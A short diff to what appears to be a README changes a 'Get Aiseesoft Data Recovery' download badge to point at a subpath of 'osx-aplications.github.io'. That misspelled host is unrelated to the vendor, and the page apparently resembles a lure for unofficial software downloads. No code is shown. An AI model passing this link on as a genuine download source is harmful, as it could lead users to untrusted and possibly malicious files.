@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/">
+  <a href="https://osx-aplications.github.io/.github/aiseesoft">
     <img src="https://img.shields.io/badge/Get%20Aiseesoft%20Data%20Recovery-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Aiseesoft Data Recovery">
   </a>
 </p>
